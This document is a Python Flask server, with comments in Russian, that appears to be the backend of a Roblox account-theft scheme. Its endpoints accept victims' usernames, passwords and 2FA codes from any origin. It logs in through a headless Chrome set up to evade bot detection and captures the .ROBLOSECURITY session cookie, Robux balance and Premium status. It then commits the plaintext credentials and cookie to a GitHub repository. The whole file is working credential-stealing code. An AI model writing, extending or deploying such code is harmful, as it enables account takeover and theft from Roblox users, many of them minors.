import os
import logging
import random
import string
import time
import socket
from datetime import datetime
from flask import Flask, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import WebDriverException, TimeoutException, NoSuchElementException
import git
import json
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

# Конфигурация
ORDERS_REPO = f"https://github.com/{os.getenv('GITHUB_USERNAME')}/base.git"
ORDERS_DIR = "orders"
SCREENSHOT_DIR = "screenshots"
MAX_LOGIN_ATTEMPTS = 3
REQUEST_TIMEOUT = 30

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

def get_chrome_options():
    """Возвращает настройки для Chrome с учетом работы на Render"""
    options = Options()
    options.binary_location = "/opt/render/.cache/chromium/chrome-linux/chrome"  # Путь к Chrome на Render
    
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    
    # Случайный user-agent
    chrome_version = random.randint(100, 115)
    options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36")
    
    return options

def install_chrome():
    """Устанавливает Chrome на Render"""
    os.system("apt-get update")
    os.system("apt-get install -y chromium-browser")

def generate_filename():
    """Генерирует имя файла"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    rand_str = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    return f"account_{timestamp}_{rand_str}.json"

def init_repository():
    """Инициализирует git репозиторий"""
    try:
        if os.path.exists(os.path.join(ORDERS_DIR, '.git')):
            repo = git.Repo(ORDERS_DIR)
            repo.git.pull()
            logger.info("Репозиторий обновлен")
        else:
            if os.path.exists(ORDERS_DIR):
                for item in os.listdir(ORDERS_DIR):
                    if item != '.git':
                        os.remove(os.path.join(ORDERS_DIR, item))
            
            repo_url = f"https://{os.getenv('GITHUB_USERNAME')}:{os.getenv('GITHUB_TOKEN')}@{ORDERS_REPO.split('https://')[1]}"
            git.Repo.clone_from(repo_url, ORDERS_DIR)
            logger.info("Репозиторий клонирован")
        return True
    except Exception as e:
        logger.error(f"Ошибка работы с репозиторием: {str(e)}")
        return False

def save_account_data(data):
    """Сохраняет данные аккаунта"""
    try:
        if not init_repository():
            return False
        
        filename = generate_filename()
        filepath = os.path.join(ORDERS_DIR, filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        repo = git.Repo(ORDERS_DIR)
        repo.git.add(filepath)
        repo.index.commit(f"Add account {filename}")
        origin = repo.remote(name='origin')
        origin.push()
        
        logger.info(f"Данные сохранены в {filename}")
        return True
    except Exception as e:
        logger.error(f"Ошибка сохранения данных: {str(e)}")
        return False

def human_like_delay(min_sec=0.1, max_sec=0.5):
    """Имитирует человеческую задержку"""
    time.sleep(random.uniform(min_sec, max_sec))

def process_login(username, password, code_2fa=None):
    """Обрабатывает вход в аккаунт"""
    driver = None
    try:
        # Установка ChromeDriver
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=get_chrome_options())
        
        # Настройка браузера
        driver.execute_cdp_cmd("Network.setUserAgentOverride", {
            "userAgent": driver.execute_script("return navigator.userAgent;").replace("Headless", "")
        })
        
        # Логин процесс
        driver.get("https://www.roblox.com/login")
        human_like_delay(1, 2)
        
        try:
            cookie_btn = WebDriverWait(driver, 3).until(
                EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Accept')]")))
            cookie_btn.click()
            human_like_delay()
        except:
            pass
        
        username_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "login-username")))
        username_field.send_keys(username)
        human_like_delay()
        
        password_field = driver.find_element(By.ID, "login-password")
        password_field.send_keys(password)
        human_like_delay()
        
        login_btn = driver.find_element(By.ID, "login-button")
        login_btn.click()
        human_like_delay(1, 2)
        
        if code_2fa:
            try:
                code_field = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.XPATH, "//input[@name='verificationCode']")))
                code_field.send_keys(code_2fa)
                human_like_delay()
                
                submit_btn = driver.find_element(By.XPATH, "//button[contains(., 'Verify')]")
                submit_btn.click()
                human_like_delay(2, 3)
            except Exception as e:
                return {'status': '2fa_error', 'message': f'2FA error: {str(e)}'}
        
        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'avatar-container')]")))
            
            account_data = {
                'username': username,
                'password': password,
                'status': 'active',
                'robux': get_robux_balance(driver),
                'premium': check_premium_status(driver),
                'cookie': driver.get_cookie('.ROBLOSECURITY')['value'] if driver.get_cookie('.ROBLOSECURITY') else None,
                'timestamp': datetime.now().isoformat()
            }
            
            return {'status': 'success', 'data': account_data}
            
        except TimeoutException:
            error_msg = check_for_errors(driver)
            if error_msg:
                return {'status': 'error', 'message': error_msg}
            
            return {'status': 'unknown_error', 'message': 'Unknown error'}
            
    except Exception as e:
        logger.error(f"Critical error: {str(e)}")
        return {'status': 'critical_error', 'message': str(e)}
    finally:
        if driver:
            driver.quit()

def get_robux_balance(driver):
    """Получает баланс Robux"""
    try:
        driver.get("https://www.roblox.com/transactions")
        balance = WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'robux-balance')]"))).text
        return balance.strip()
    except:
        return "0"

def check_premium_status(driver):
    """Проверяет наличие Premium"""
    try:
        driver.get("https://www.roblox.com/premium/membership")
        WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'premium-icon')]")))
        return True
    except:
        return False

def check_for_errors(driver):
    """Проверяет наличие сообщений об ошибках"""
    error_messages = [
        "incorrect username or password",
        "неверное имя пользователя или пароль",
        "account locked",
        "требуется проверка",
        "verification required"
    ]
    
    page_text = driver.page_source.lower()
    for msg in error_messages:
        if msg in page_text:
            return msg.capitalize()
    
    return None

@app.route('/')
def home():
    return jsonify({"status": "ok", "message": "Service is running"})

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok', 'timestamp': datetime.now().isoformat()})

@app.route('/process_login', methods=['POST'])
def handle_login():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'}), 200

    if not request.is_json:
        return jsonify({'status': 'error', 'message': 'Invalid content type'}), 400
    
    try:
        data = request.get_json()
    except:
        return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
    
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({'status': 'error', 'message': 'Missing credentials'}), 400
    
    logger.info(f"Processing login for: {username}")
    result = process_login(username, password)
    
    if result['status'] == 'success':
        if not save_account_data(result['data']):
            return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
    
    return jsonify(result)

@app.route('/submit_2fa', methods=['POST'])
def handle_2fa():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'}), 200

    if not request.is_json:
        return jsonify({'status': 'error', 'message': 'Invalid content type'}), 400
    
    try:
        data = request.get_json()
    except:
        return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
    
    code = data.get('code')
    username = data.get('username')
    password = data.get('password')
    
    if not all([code, username, password]):
        return jsonify({'status': 'error', 'message': 'Missing data'}), 400
    
    logger.info(f"Processing 2FA for: {username}")
    result = process_login(username, password, code)
    
    if result['status'] == 'success':
        if not save_account_data(result['data']):
            return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
    
    return jsonify(result)

@app.before_request
def log_request():
    logger.info(f"Incoming request: {request.method} {request.url}")

if __name__ == '__main__':
    # Установка Chrome при первом запуске
    if not os.path.exists("/opt/render/.cache/chromium"):
        logger.info("Installing Chrome...")
        install_chrome()
    
    # Проверка переменных окружения
    required_env_vars = ['GITHUB_USERNAME', 'GITHUB_TOKEN']
    for var in required_env_vars:
        if not os.getenv(var):
            logger.error(f"Missing required environment variable: {var}")
            exit(1)
    
    # Создание директорий
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    os.makedirs(ORDERS_DIR, exist_ok=True)
    
    # Запуск сервера
    port = int(os.getenv('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
